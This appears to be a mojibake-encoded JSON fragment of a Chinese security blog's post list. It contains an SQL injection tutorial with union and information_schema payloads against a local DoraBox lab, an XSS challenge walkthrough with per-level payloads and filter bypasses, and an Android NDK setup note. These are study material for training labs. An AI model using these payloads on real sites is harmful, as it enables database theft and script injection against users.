/Users/gjy/.android/repositories.cfg 3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½åœ¨ç»ˆç«¯è¾“å…¥ï¼šandroidè¿™å°±okäº†ã€‚ å®‰å“NDKæ­å»ºå‰ææ˜¯å·²ç»å®‰è£…äº†homebrewç¥å™¨ï¼š 1ï¼šä¸‹è½½NDKï¼šbrew search android-ndk brew cask install android-ndk 2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼švim .zshrc export ANDROID_NDK_HOME=\"/usr/local/share/android-ndk\" //æ·»åŠ è¿›å»æ­£å¸¸ä¿å­˜é€€å‡º source .zshrc 3ï¼šæ£€éªŒï¼šndk-buildå·²ç»æˆåŠŸäº†ã€‚","categories":[],"tags":[]},{"title":"SQLæ³¨å…¥åŸºç¡€å­¦ä¹ ","slug":"SQLåŸºç¡€å­¦ä¹ ","date":"2019-09-01T11:17:25.000Z","updated":"2020-08-10T03:50:09.666Z","comments":true,"path":"2019/09/01/SQLåŸºç¡€å­¦ä¹ /","link":"","permalink":"http://chumen77.xyz/2019/09/01/SQLåŸºç¡€å­¦ä¹ /","excerpt":"","text":"SQLæ³¨å…¥åŸºç¡€å­¦ä¹ æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œä½¿ç”¨and,or,xor,likeæµ‹è¯• ** 1=1 ** 1=2å…¶ä¸­**å¯ä»¥ä¸ºand or xor likeä»»æ„ä¸€ä¸ªpsï¼šåŸºæœ¬è¯­å¥ï¼Œæ³¨æ„çœŸå‡é€»è¾‘å…³ç³»ï¼Œçµæ´»è¿›è¡Œæµ‹è¯•ã€‚ ä½¿ç”¨ç¬¦å·æµ‹è¯• å•å¼•å· å‡å· æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œæ­¤å¤„è·Ÿæ•°å­—å‹æµ‹è¯•åŠæ³•åŸºæœ¬ä¸€æ ·ï¼Œè¿˜æ˜¯ä½¿ç”¨and,or,xor,likeã€å•å¼•å·æµ‹è¯•ã€‚æœ€è¿‘æ¥è§¦å­—ç¬¦å‹çš„æ³¨å…¥è¾ƒå°‘ï¼Œè¡¥å……ä¸€ä¸‹åŸç†ï¼š æˆ‘ä»¬å…ˆè¿›è¡Œæ­£å¸¸æŸ¥è¯¢ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submitå½“æˆ‘ä»¬ç»™æ¥å—å¤„åŠ &#39;ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submitè¯­å¥æ‰§è¡Œåï¼Œä¼šäº§ç”ŸæŠ¥é”™ï¼šç„¶åæˆ‘ä»¬æƒ³åŠæ³•ä¸è®©å…¶æŠ¥é”™ï¼Œå°±æ˜¯æ¥çœç•¥åé¢é‚£ä¸ªphpä»£ç è¯­å¥åŠ çš„&#39;: ç”¨#æ¥æ³¨é‡Šï¼Œä½†éœ€è¦è¿›è¡Œurlæ¥è½¬å˜ä¸€ä¸‹ä¸º%23 ç”¨--+ --%20æ¥æ³¨é‡Šç„¶åå°±å¯ä»¥æ¥ç”¨and or xor likeæ¥æµ‹è¯•äº†ï¼Œä¾‹å¦‚ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submithttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit unionçŸ¥è¯†å°è®°unionåœ¨é›†åˆä¸¤ä¸ªselectæŸ¥è¯¢è¯­å¥æ—¶ï¼Œä¸€å®šè¦æ³¨æ„ä¸¤ä¸ªæŸ¥è¯¢å‡ºæ¥çš„ç»“æœ,åˆ—æ•°ï¼ˆcolumnsï¼‰è¦ç›¸ç­‰æ‰ä¼šå‡ºæ¥ç»“æœã€‚ä¾‹å¦‚ï¼šSELECT * from news union SELECT 1,2;æŠ¥é”™ï¼Œæ¢æˆSELECT * from news union SELECT 1,2,3; order by çŸ¥è¯†å°è®°order byæ˜¯æŒ‰ç…§ä¸€å®šè§„åˆ™æ¥è¿›è¡Œæ’åºçš„è¯­å¥ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€šè¿‡order byæ’åºï¼Œæ¥æ’å‡ºæ¥åˆ—åæœ‰å¤šå°‘ä¸ªå‘¢ï¼Ÿæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼š SELECT * from test ORDER BY 1;å½“æˆ‘ä»¬åœ¨æµ‹è¯•åˆ°SELECT * from test ORDER BY 5;å‘ç°å‡ºäº†å¼‚å¸¸ã€‚æˆ‘ä»¬æ¢ä¸ª3åˆ—çš„è¡¨ï¼š`SELECT * from newsORDER BY 3;`æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„`SELECT * from newsORDER BY 4;`æ‰€ä»¥å¯ä»¥å‘ç°æˆ‘ä»¬åœ¨order byååŠ æ•°å­—å¯ä»¥æ¥æµ‹å‡ºæ¥ä¸€ä¸ªè¡¨çš„åˆ—åä¸ªæ•°ã€‚ æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœæ˜¾ç¤ºæˆ‘ä»¬è‡ªå®šä¹‰æŸ¥è¯¢çš„ç»“æœï¼Œè¯¥æ€ä¹ˆå®ç°å‘¢ã€‚å…ˆåœ¨é¶åœºæµ‹è¯•ï¼šSELECT * FROM news WHERE id = 2 union select 1,2,3 from test æ˜æ˜¾ç½‘é¡µæ˜¯ä¸ç»™æ˜¾ç¤ºçš„ã€‚ç›¸åŒè¯­å¥åœ¨æ•°æ®åº“ï¼šä¸ç»™æ˜¾ç¤ºæ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯phpä»£ç è¿›è¡Œäº†å¤„ç†ï¼Œåªå¯ä»¥æ˜¾ç¤ºå‡ºä¸€æ¡ç»“æœã€‚é‚£å¦‚æœæŠŠç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æœç»™æ— æ³•æ˜¾ç¤ºï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬è”åˆæŸ¥è¯¢çš„ç»“æœå‘¢ã€‚å…ˆåœ¨æ•°æ®åº“æµ‹è¯•ä¸‹SQLè¯­å¥ï¼šSELECT * FROM news WHERE id = -1å‘ç°æ˜¯ä¸æ˜¾ç¤ºä¸œè¥¿çš„ã€‚ç»§ç»­æµ‹è¯•:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;æ¥ç€æˆ‘ä»¬æ‹¿åˆ°é¶åœºæµ‹è¯•ï¼š è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚çœ‹è¿™ä¸ªé¡µé¢æ˜¾ç¤ºçš„æ•ˆæœ2 3ï¼Œåå‘æ€ç»´è€ƒè™‘æŠŠ2 3æ”¹æˆæˆ‘ä»¬çš„åˆ—åæ˜¯ä¸æ˜¯å°±å¯ä»¥å‡ºæ•°æ®äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚ä½•çŸ¥é“è¡¨é‡Œçš„åˆ—åå‘¢ï¼Ÿ existsï¼ˆï¼‰å‡½æ•°å°è®°exists()æ˜¯éªŒè¯æŸä¸ªè¯­å¥æ˜¯å¦å­˜åœ¨ç»“æœï¼Œæ˜¯ä¸ªboolå‡½æ•°ï¼Œå­˜åœ¨æ˜¾ç¤º1åä¹‹æ˜¯0ã€‚SELECT * FROM news WHERE id=1 and exists(select * from test);åœ¨æ•°æ®åº“è¿›è¡Œæµ‹è¯•:SELECT * FROM news WHERE id=1 and exists(select * from aa);å‘ç°åœ¨ç”¨è¿™ä¸ªå‡½æ•°æŸ¥ä¸å­˜åœ¨çš„è¡¨çš„æ—¶å€™è¯­å¥æ˜¯æ²¡æ³•è¿›è¡Œçš„ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè¯­å¥æ¥æ¨å‡ºè¡¨åå’Œåˆ—åï¼Œä¸è¿‡ååˆ†éº»çƒ¦ï¼Œå¯ä»¥é€šè¿‡burpsuitæ¥è·‘ã€‚è¿˜æœ‰æ„å¤–æ”¶è·ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®åº“çš„åå­—pentestå°±æ˜¯æ•°æ®åº“çš„åå­—äº†ã€‚ æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰%çš„ä½œç”¨%åœ¨mysqlä¸­è¡¨ç¤ºé€šé…ç¬¦ã€‚åœ¨SQLè¯­å¥ä¸­:******* like &#39;%a&#39;ï¼Œå°±æ˜¯æœç´¢è¿”å›ä»¥å­—æ¯aç»“å°¾çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒç†a%%a%`,åˆ†åˆ«å°±æ˜¯ æœç´¢è¿”å›ä»¥å­—æ¯aå¼€å¤´çš„æ‰€æœ‰ä¿¡æ¯å’Œæœç´¢è¿”å›åŒ…å«å­—æ¯a`çš„æ‰€æœ‰ä¿¡æ¯ã€‚ å¦‚ä½•æ³¨å…¥å’±ä»¬å…ˆçœ‹ä¸‹phpæºä»£ç :$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //searchå¾ˆæ˜æ˜¾æå‰é—­åˆ&#39;%è·Ÿçœç•¥åé¢çš„%&#39;å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit ç„¶åæˆ‘ä»¬æ­£å¸¸èµ°æ­¥éª¤ï¼Œåˆ©ç”¨order byæ¥ç¡®å®šä¸‹å¤šå°‘åˆ—ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submitç»§ç»­http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submitå¯ä»¥ç¡®å®šæ˜¯3åˆ—äº†ã€‚ ç„¶åå¼€å§‹ç¡®å®šè¡¨åï¼Œè¿™æ¬¡ç”¨åˆšåˆšå­¦çš„exist()æ¥æµ‹è¯•ï¼Œå¹¶ä¸”ç»ƒä¹ ä¸€ä¸‹burpæ¥è·‘è¡¨åå’Œåˆ—åï¼šå…ˆæ­£å¸¸æ„é€ payloadï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submitç¡®å®šnewsè¡¨åå­˜åœ¨ï¼Œç„¶åå¼€å§‹ç”¨burpè·‘å…¶ä»–çš„ï¼šæˆ‘ä»¬æ˜¯è·‘è¡¨åï¼Œæ‰€ä»¥åœ¨newsåŠ ä¸Šå˜é‡ã€‚è¿™ä¸ªæ­¥éª¤éœ€è¦å…ˆç‚¹ç„¶ååœ¨â€œæ·»åŠ â€œæŒ‰é’®æ—çš„ä½ç½®å¼€å§‹å¡«å…¥æµ‹è¯•çš„è¡¨åï¼Œè¿™ä¸ªæˆ‘æ˜¯æ‰‹åŠ¨å¡«çš„ï¼Œå¯ä»¥è¿›è¡Œå¯¼å…¥å­—å…¸ã€‚ç„¶åæˆ‘ä»¬å¼€å§‹çœ‹ç»“æœRenderä¸‹é¢æ˜¾ç¤ºæ­£å¸¸å°±è¯æ˜æ˜¯å­˜åœ¨çš„ã€‚è¿™ä¸ªæ˜¯ä¸å­˜åœ¨ã€‚æœ€ç»ˆç”¨è¿™ä¸ªåŠæ³•å¯ä»¥è·‘å‡ºè¡¨åtestã€accountã€‚åŒæ ·åŠæ³•è·‘åˆ—åï¼š ç¡®å®šå‡ºnewsè¡¨ä¸­æœ‰idã€titleã€contentç­‰åˆ—ã€‚ ç„¶åæˆ‘ä»¬æ›´æ–°ä¸‹è¯­å¥æ¥æŸ¥è¡¨å’Œåˆ—ï¼Œexists()è¿™ä¸ªåŠæ³•æ˜¯æœ‰ç‚¹è€çš„æ¯”è¾ƒç¬¨ã€‚åœ¨MySQL&gt;5.1ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨information_schemaå‘ç°è¿™ä¸ªæˆ‘ä»¬çš„æ•°æ®åº“å’Œåˆ—åéƒ½å¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¥ä¸‹è¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼šç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å…ˆè®©å…¶å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submitæŠŠæ ‡é¢˜ä¸‹çš„2æ¢æˆdarabase()å‡½æ•°ï¼Œæ¥æ˜¾ç¤ºä¸‹æ•°æ®åº“çš„åå­—ã€‚http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submitç„¶åæˆ‘ä»¬å°±çš„å¾—åˆ°äº†pentestï¼Œç„¶åå¼€å§‹åˆ©ç”¨è¿™ä¸ªmysql&gt;5.1ç‰¹æ€§æ¥æ„é€ è¯­å¥ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submitä½†æ˜¯åœ¨è¿™é‡Œé¢æ€ä¹ˆæ˜¾ç¤ºå…¶ä»–çš„åå­—å‘¢ï¼Ÿç»§ç»­:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submitå…¶ä¸­å¯ä»¥å°†!=æ¢æˆ&lt;&gt;æ˜¯åŒæ ·çš„æ•ˆæœã€‚ç»§ç»­åœ¨è¯­å¥ä¸­åŠ andå’Œä¸ç­‰äºå‰é¢æŸ¥å‡ºçš„è¡¨çš„åå­—ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submitæˆ‘ä»¬å‘ç°è¿™æ ·å¾ˆç¹çï¼Œå¦‚ä½•èƒ½å¤Ÿè®©ä¸€ä¸‹å­å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥å‘¢ï¼Œç”¨åˆ°äº†group_cancat()å‡½æ•°ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit ç„¶åæˆ‘ä»¬ç»§ç»­å»æŸ¥åˆ—åï¼Œç„¶åè½¬åˆ°infromation_schemaçš„columnsä¸‹ï¼Œä¸€ç›´æœç´¢accountä¸‹æ»‘å‘ç°ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªåˆ—è¡¨ä¸‹å¯ä»¥æ‹¿åˆ°æ›´å…¨çš„ä¿¡æ¯ï¼š å»å¯¹æ¯”ä¸‹accountè¡¨ä¸‹çš„åˆ—åä¿¡æ¯ï¼šæ˜¯ç›¸å¯¹åº”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´æ”¹ä¸‹è¯­å¥ï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submitå‘ç°æˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°è¿™ä¸ªè¡¨åï¼Œå¯¹æ¯”æ•°æ®åº“æˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‰ç…§è¡¨åå‡ºç°çš„ä¸ªæ•°çœ‹å‡ºå…¶è¡¨ä¸‹æœ‰å¤šå°‘åˆ—ã€‚ç„¶åæˆ‘ä»¬æ‹¿newsæµ‹è¯•ä¸‹è·å–åˆ—åï¼šhttp://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chumen77.xyz/tags/SQL/"}]},{"title":"XSSæŒ‘æˆ˜ä¹‹æ—…","slug":"XSSæŒ‘æˆ˜ä¹‹æ—…","date":"2019-08-20T12:29:45.000Z","updated":"2020-02-28T07:54:30.000Z","comments":true,"path":"2019/08/20/XSSæŒ‘æˆ˜ä¹‹æ—…/","link":"","permalink":"http://chumen77.xyz/2019/08/20/XSSæŒ‘æˆ˜ä¹‹æ—…/","excerpt":"","text":"XSSæŒ‘æˆ˜ä¹‹æ—…å…³å¡ç¬¬ä¸€å…³payload:&lt;script&gt;alert(1)&lt;/script&gt;æ­¤é¢˜æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯­å¥ï¼Œåœ¨æ ‡ç­¾ä¹‹é—´è¿›è¡Œè¾“å‡ºã€‚ ç¬¬äºŒå…³æ­¤é¢˜å˜æˆäº†&lt;input&gt;æ ‡ç­¾ï¼Œçœ‹åˆ°æ­¤å¤„åå¯ä»¥è€ƒè™‘ï¼Œæå‰é—­åˆæ‰è¿™ä¸ªæ ‡ç­¾ï¼Œæ‰€ä»¥æ„é€ payloadï¼š&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ï¼Œ æˆ–è€…ä¹Ÿå¯ä»¥payloadï¼š&quot; onclick=alert(1)&gt;è¿™ä¸ªéœ€è¦ç‚¹å‡»æœç´¢åï¼Œå†ç‚¹å‡»æœç´¢æ¡†ï¼Œå±äºå€ŸåŠ©jsäº‹ä»¶ç±»å‹ã€‚ ç¬¬ä¸‰å…³å˜æˆäº†å•å¼•å·çš„inputæ ‡ç­¾ï¼Œå…ˆå°è¯•é—­åˆinputæ ‡ç­¾è¿™ä¸ªæ€è·¯ã€‚å‘ç°æ²¡æœ‰è¿‡å»ï¼Œå»çœ‹ä¸‹ç½‘é¡µä»£ç ã€‚å‘ç°å…¶è¿‡æ»¤äº†&lt; &gt;,è¿™æ ·åªèƒ½é€šè¿‡jsäº‹ä»¶æ¥æ„é€ å¼¹çª—ã€‚è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä¸è¿‡æ­¤å¤„æ˜¯å•å¼•å·ï¼Œæ‰€ä»¥æ„é€ payloadï¼š&#39; onclick=&#39;alert(1)æ³¨æ„æ­¤å¤„çš„alert(1)çš„å‰é¢è¿˜æœ‰ä¸ªå•å¼•å·ï¼Œå…¶æ•ˆæœå°±æ˜¯value=&#39;&#39; onclick=&#39;alert(1)&#39; ç¬¬å››å…³æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œè¿˜æ˜¯è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œä¸è¿‡æ˜¯å•å¼•å·æ¢æˆäº†åŒå¼•å·ã€‚æŒ‰ç…§åŸæ¥çš„æ€è·¯ï¼Œæ„é€ payloadï¼š&quot; onclick=&quot;alert(1) ç¬¬äº”å…³çœ‹ç½‘é¡µæºä»£ç ï¼Œè·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œç›´æ¥å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadã€‚&lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;å†æ¬¡æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºå¯¹onè¿›è¡Œäº†è¿‡æ»¤ï¼Œåœ¨å°è¯•åŒå†™ã€æ”¹å˜å¤§å°å†™æ— æœåã€‚æ¢æ€è·¯çœ‹çœ‹&lt; &gt;æ˜¯å¦è¿‡æ»¤ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åè€ƒè™‘å…ˆé—­åˆinputæ ‡ç­¾ï¼Œç„¶åæ„é€ ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»åè°ƒç”¨jsäº‹ä»¶ã€‚payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;ç„¶åç‚¹å‡»å°±okäº†ã€‚ ç¬¬å…­å…³ç¬¬å…­å…³ç›´æ¥æµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åçœ‹ç½‘é¡µæºä»£ç ï¼š&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;å‘ç°hrefé­åˆ°äº†è¿‡æ»¤ï¼Œç»“æœå‘ç°æ”¹å˜å¤§å°å†™å¯ä»¥ç»•è¿‡ã€‚payloadï¼š&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; ç¬¬ä¸ƒå…³è¿˜æ˜¯å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œç„¶åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ï¼šhrefä¸scriptç›´æ¥è¢«æ›¿æ¢æˆäº†ç©ºï¼Œç„¶åè€ƒè™‘åŒå†™ç»•è¿‡ï¼Œæ„é€ payloadï¼š&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; ç¬¬å…«å…³å‘ç°æœ‰äº›ä¸ä¸€æ ·äº†ï¼Œç„¶åå…ˆç‚¹ä¸‹â€æ·»åŠ å‹æƒ…é“¾æ¥â€œæŒ‰é’®ï¼Œå»çœ‹ä¸‹ç½‘é¡µæºä»£ç ã€‚ä¼šå‘ç°è¿™ä¸ªé¢˜æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹æ¥è¿›è¡Œxssæ”»å‡»ã€‚å…ˆæ„é€ payloadï¼šjavascript:alert(1)ï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åæŸ¥çœ‹æºä»£ç &lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;å¯ä»¥å‘ç°å…¶è¿‡æ»¤äº†å­—ç¬¦ä¸²scriptï¼Œå› ä¸ºæ­¤å¤„ä¸ºhtmlæ ‡è®°è¯­è¨€ï¼Œè€ƒè™‘æŠŠâ€râ€è½¬æ¢ä¸ºHTMLå®ä½“æ¥ç»•è¿‡ã€‚æ„é€ payloadï¼šjavasc&amp;#114;ipt:alert(1) ç¬¬ä¹å…³è¿™é¢˜è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€ä¸ªç±»å‹ï¼Œä½†æ˜¯å‘ç°ä¸ç®¡åŠ å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤ºè¿™ä¸ªã€‚ä¸å¦‚åŠ å…¥ä¸ªæ­£å¸¸åˆæ³•é“¾æ¥è¯•ä¸€è¯•ï¼Œhttp://www.baidu.com,å‘ç°æ˜¾ç¤ºæ­£å¸¸äº†ï¼Œç»è¿‡æµ‹è¯•åå‘ç°å…¶åœ¨æ£€æµ‹åˆ°http://åæ‰ä¼šæ­£å¸¸æ˜¾ç¤ºä½ çš„ä»£ç ã€‚æ‰€ä»¥æ„é€ payloadï¼šjavasc&amp;#114;ipt:alert(1)//http://æ³¨æ„â€//â€œè¿™ä¸ªæ˜¯æ¥æ³¨é‡Šåé¢çš„ä»£ç çš„ã€‚ ç¬¬åå…³è¿›æ¥ä»¥åå‘ç°æ— ä»»ä½•å¯è¾“å…¥çš„åœ°æ–¹ï¼Œç„¶åå°±æŸ¥çœ‹æºä»£ç  å‘ç°å…¶typeç±»å‹å…¨æ˜¯hiddenï¼Œç„¶åè€ƒè™‘æ˜¯ä¸æ˜¯è€ƒå¯Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œåœ¨æŸ¥è¯¢åå‘ç°å¤§å¤šè§£å†³åŠæ³•å°±æ˜¯æŠŠhiddenï¼Œæ”¹ä¸ºtextç±»å‹ã€‚å› ä¸ºåœ¨æµè§ˆå™¨getåˆ°type=â€***â€œï¼Œå³å¯æŠŠåŸæ¥çš„typeç»™æ›¿æ¢æ‰€ä»¥è€ƒè™‘æ„é€ payloadï¼š&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()ç„¶åä¼šå‡ºç°ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»åå³å¯è¿‡å…³ã€‚æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯æŸ¥çœ‹æºä»£ç åå‘ç°æœ‰ä¸‰ä¸ªinputæ ‡ç­¾ï¼Œä½†å®é™…æµ‹è¯•åªæœ‰æœ€åä¸€ä¸ªname=&quot;t_sort&quot;æ‰ä¼šå‡ºç°æ–‡æœ¬æ¡†ï¼Œæ‰€ä»¥æ„é€ äº†ä»¥æœ€åä¸€ä¸ªæ ‡ç­¾ä¸ºæ”»å‡»ç‚¹çš„payloadã€‚ ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³è¿™å‡ å…³éƒ½æ˜¯httpå¤´æ³¨å…¥éœ€è¦æŠ“åŒ…æ¥å®Œæˆï¼ŒåŸºæœ¬å¤§å·®ä¸å·®çš„ã€‚ç¬¬åä¸€å…³ Refererç¬¬åäºŒå…³ ua ç¬¬åä¸‰å…³ cookieæ˜æ˜¾æ˜¯cookieæ³¨å…¥äº† ç¬¬åå››è‡³æœ€åè¿™å‡ é“é¢˜åŸºæœ¬éƒ½æ˜¯çœ‹ç€åˆ«äººçš„åšå®¢æ‰åšçš„ä¸‹æ¥ï¼Œå¹¶ä¸”åšäº†æ„Ÿè§‰ä¸æ˜¯å¤ªæ˜ç™½åŸç†ï¼Œå°±å…ˆä¸æ€»ç»“äº†ã€‚ä»¥åå­¦åˆ°æ›´æ·±çš„å†è¿›è¡Œæ€»ç»“ã€‚ ç»•è¿‡å§¿åŠ¿å°è¡¥å……â€œ()â€è¢«è¿‡æ»¤ç”¨â€ ` â€œ å­—ç¬¦äº†æ¥ä»£æ›¿æ‹¬å·ã€‚ payload: alert`1` å°è¿›é˜¶ â€œ ` â€œ â€œ()â€åŒæ—¶è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨ &lt;svg&gt; æ ‡ç­¾ï¼Œå…¶æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å¯ä»¥æ‰§è¡ŒHTMLå®ä½“ä»£ç ã€‚ç”¨æ³•æ˜¯&lt;svg&gt;&amp;#æ•°å­—;æ‰€ä»¥æ„é€ payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"XSSçŸ¥è¯†ç®€å•å­¦ä¹ ","slug":"xsså­¦ä¹ ","date":"2019-08-16T08:21:01.000Z","updated":"2020-02-28T07:54:44.000Z","comments":true,"path":"2019/08/16/xsså­¦ä¹ /","link":"","permalink":"http://chumen77.xyz/2019/08/16/xsså­¦ä¹ /","excerpt":"","text":"XSSçŸ¥è¯†ç®€å•å­¦ä¹ ä¸€:Xssç®€ä»‹XSSæ”»å‡»å…¨ç§°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSï¼ŒXSSæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€œï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚ 